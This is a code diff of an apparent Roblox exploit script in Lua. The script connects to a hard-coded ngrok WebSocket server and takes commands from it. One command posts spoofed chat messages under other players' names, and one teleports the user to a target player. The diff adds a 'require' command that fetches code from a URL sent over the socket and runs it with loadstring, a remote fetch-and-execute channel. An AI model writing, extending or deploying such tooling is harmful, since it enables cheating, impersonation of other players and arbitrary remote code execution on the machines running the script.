@@ -9,6 +9,8 @@
 
 Beta 0.1
 ]]
+if getgenv().RemoteSocket then warn("Already Exist") return end
+
 getgenv().RemoteSocket = {
     MainUrl = "",
     Status = false,
@@ -47,7 +49,7 @@ function fakeChat(target,msg)
     local plr = target
     local channel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
     channel:DisplaySystemMessage('<font color="rgb(255,0,0)">' .. plr.Name .. ': </font>' .. msg)
-    local head = plr.Character.Head
+    local head = plr.Character
     TextChatService:DisplayBubble(head, msg)
 end
 
@@ -58,6 +60,7 @@ end
 getgenv().Socket = {}
 
 local RemoteSocket = getgenv().RemoteSocket
+
 function Socket:SetMain(url)
     RemoteSocket.MainUrl = url
     if not RemoteSocket.Status then
@@ -67,7 +70,6 @@ function Socket:SetMain(url)
         RemoteSocket.ClientId = getplayer().UserId
     end
 end
-
 Socket:SetMain("wss://xochitl-superexacting-unconcentrically.ngrok-free.dev")
 repeat
 task.wait(0.2)    
@@ -76,17 +78,18 @@ until getgenv().RemoteSocket.MainUrl ~= ""
 local Players = import.Players
 local sockets = WebSocket.connect(RemoteSocket.MainUrl)
 sockets.OnClose:Connect(function()
-    print("Session Clossed")
+    warn("Session Clossed")
 end)
 
 sockets.OnMessage:Connect(function(msg)
     if not RemoteSocket.Status then
         RemoteSocket.Status = true
+        print("Connected")
     end
+    print("recive",msg)
     if msg == "|ConnectedToSocket|" then
         return
     end
-    print("recive",msg)
     local args = string.split(msg," | ")
     local name = args[1]
     local id = args[2]
@@ -131,7 +134,7 @@ end
 function Socket:CloseSession()
     sockets:Close()
     getgenv().RemoteSocket = nil
-    print("Clossed")
+    warn("Clossed")
 end
 
 function Socket.new(name,func)
@@ -145,7 +148,7 @@ function Socket.new(name,func)
             RemoteSocket.RemoteCom[name] = remote
             return RemoteSocket.RemoteCom[name]
         end
-        return error(name,"is alread exist")
+        return error(tostring(name),"is alread exist")
     end
     error("name must be string")
 end
@@ -161,7 +164,7 @@ function Socket.request(name,call)
             RemoteSocket.Invoker[name] = remote
             return RemoteSocket.Invoker[name]
         end
-        return error(name,"is alread exist")
+        return error(name .. "is alread exist")
     end
     error("name must be string")
 end
@@ -180,7 +183,6 @@ function Socket:FireSocket(op,...)
         op = "@" .. getplayer().Name
     elseif op:match("%$(.-)$") then
         local partial = op:match("%$(.-)$")
-        print("partial:",partial)
         op = findPlayer(partial).Name
     end
     local value = self.Name .. " | " .. tostring(self.Id) .. " | "  .. op .. " | " ..table.concat(args,",",1)
@@ -263,10 +265,7 @@ end)
 
 getgenv().chat = Socket.new("chat",function(id,...) 
     local args = {...}
-    print(id)
     local sender = Players:GetPlayerByUserId(tonumber(id))
-    print(sender,table.concat(args," ",1))
-    print(table.concat(args," ",1),typeof(table.concat(args," ",1)))
     fakeChat(sender,table.concat(args," ",1))
 end)
 
@@ -276,6 +275,11 @@ getgenv().ldxbring = Socket.new("Bring",function(id,target)
     if Players[target].Character then
         getrootpart().CFrame = Players[target].Character.HumanoidRootPart.CFrame + Vector3.new(0,1,0) --cuz target is a string
     end
+end)
+
+getgenv().ldxrequire = Socket.new("require",function(id,target,url)
+    print(id,target,url)
+    loadstring(game:HttpGet(url):gsub("getplayer%(%)", 'game:GetService("Players")["' .. target .. '"]'):gsub("%.LocalPlayer", '["' .. target .. '"]'))()
 end)
 
 getgenv().ldxbringtween = Socket.new("BringTween",function(id,target,speed)
